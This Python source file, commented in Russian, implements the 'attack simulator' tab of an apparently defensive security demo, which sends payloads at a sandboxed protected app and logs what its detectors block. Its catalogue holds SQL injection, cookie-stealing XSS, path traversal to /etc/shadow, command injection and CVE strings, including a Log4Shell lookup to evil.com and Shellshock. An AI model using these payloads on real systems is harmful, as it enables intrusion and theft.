"""
screens/attacks.py — вкладка «Симулятор атак».

Каждый эндпоинт лишь транслирует действие UI в НАСТОЯЩИЙ запрос по защищённому
``sec`` приложению (см. ``sandbox.py``) и возвращает наблюдаемый результат.
Никакой собственной логики детектирования здесь нет.
"""

from AEngineApps import API

from sandbox import get_sandbox, run_flood
from state import log_attack, SCORE_MAP


# Каталог атак для UI (payload'ы + метаданные карточек).
_CATALOG = [
    {
        "id": "sqli", "name": "SQL Injection",
        "description": "Попытка внедрения SQL-кода для обхода аутентификации или уничтожения данных",
        "payloads": ["' OR 1=1 --", "'; DROP TABLE users;--", "\" UNION SELECT * FROM users--", "1' AND SLEEP(5)--"],
        "severity": "critical", "icon": "💉",
    },
    {
        "id": "xss", "name": "XSS (Cross-Site Scripting)",
        "description": "Внедрение вредоносного JavaScript для кражи cookies или перенаправления пользователей",
        "payloads": ["<script>alert('xss')</script>", "<img onerror=alert(1) src=x>", "<svg onload=alert('XSS')>", "javascript:alert(document.cookie)"],
        "severity": "high", "icon": "🕷️",
    },
    {
        "id": "lfi", "name": "LFI (Local File Inclusion)",
        "description": "Попытка чтения системных файлов через манипуляцию путями",
        "payloads": ["../../etc/passwd", "....//....//etc/shadow", "%2e%2e%2f%2e%2e%2fetc%2fpasswd", "..\\..\\windows\\system32\\config\\sam"],
        "severity": "high", "icon": "📂",
    },
    {
        "id": "rce", "name": "RCE (Remote Code Execution)",
        "description": "Удалённое выполнение команд на сервере через инъекцию команд ОС",
        "payloads": ["; cat /etc/passwd", "| ls -la", "$(whoami)", "`id`", "& ping -c 4 127.0.0.1"],
        "severity": "critical", "icon": "💀",
    },
    {
        "id": "ddos", "name": "DDoS / Rate Limiting",
        "description": "Перегрузка сервера множеством запросов. Демонстрирует работу Rate Limiter",
        "payloads": [], "severity": "medium", "icon": "🌊",
    },
    {
        "id": "cve", "name": "CVE Signature Attack",
        "description": "Атака с использованием известных уязвимостей (CVE). Проверяет сигнатурный анализ IDS",
        "payloads": [
            "${jndi:ldap://evil.com/x}",
            "() { :; }; /bin/bash -c 'cat /etc/passwd'",
            "<?php system('id'); ?>",
            "%{(#cmd='id').(@java.lang.Runtime@getRuntime().exec(#cmd))}",
        ],
        "severity": "critical", "icon": "🔐",
    },
    {
        "id": "dlp", "name": "Data Exfiltration (DLP)",
        "description": "Попытка утечки персональных данных. DLP удаляет email, телефоны и паспортные данные из ответов",
        "payloads": [], "severity": "high", "icon": "🔒",
    },
    {
        "id": "chain", "name": "Цепочка атак (Attack Chain)",
        "description": "Полная цепочка APT-атаки: разведка → эксплуатация → эксфильтрация данных",
        "payloads": [], "severity": "critical", "icon": "⛓️",
    },
]


class AttacksCatalogAPI(API):
    route = "/api/attacks/catalog"
    methods = ["GET"]

    def get(self):
        return _CATALOG


class AttackRunAPI(API):
    route = "/api/attack/run"
    methods = ["POST"]

    def post(self):
        data = self.request.get_json(silent=True) or {}
        attack_type = data.get("attack_type", "")
        payload = data.get("payload", "")
        if not attack_type or not payload:
            return {"error": "attack_type and payload required"}, 400

        result = get_sandbox().attack(payload, attack_type)
        blocked = result["blocked"]
        score = SCORE_MAP.get(attack_type, 80) if blocked else 0

        log_attack(attack_type, blocked, payload, result["detector"], result["details"])
        return {
            "blocked": blocked,
            "detector": result["detector"],
            "details": result["details"],
            "score": score,
            "payload": payload[:100],
            "status_code": result["status_code"],
        }


class AttackFloodAPI(API):
    route = "/api/attack/flood"
    methods = ["POST"]

    def post(self):
        data = self.request.get_json(silent=True) or {}
        count = min(int(data.get("count", 150)), 500)

        result = run_flood(count)
        log_attack(
            "ddos", result["blocked"] > 0,
            f"{count} запросов",
            "RateLimiter", f"Заблокировано {result['blocked']}/{count} запросов",
        )
        return result


class DLPTestAPI(API):
    route = "/api/attack/dlp-test"
    methods = ["GET"]

    def get(self):
        result = get_sandbox().dlp_test()
        actions = result["dlp_actions"]
        log_attack(
            "dlp", True, "Утечка персональных данных", "DLP",
            f"Email: {actions['email_detected']}, Phone: {actions['phone_detected']}, "
            f"Passport: {actions['passport_detected']}",
        )
        return result


class AttackChainAPI(API):
    route = "/api/attack/chain"
    methods = ["POST"]

    # Этап цепочки → тип для раздельной статистики метрик.
    _STEP_METRIC = {"recon": "lfi", "exploit": "rce", "exfil": "dlp"}

    def post(self):
        result = get_sandbox().run_chain()
        for step in result["steps"]:
            log_attack(self._STEP_METRIC.get(step["name"], step["name"]),
                       step["blocked"], step["payload"], step["detector"], step["phase"])
        return result
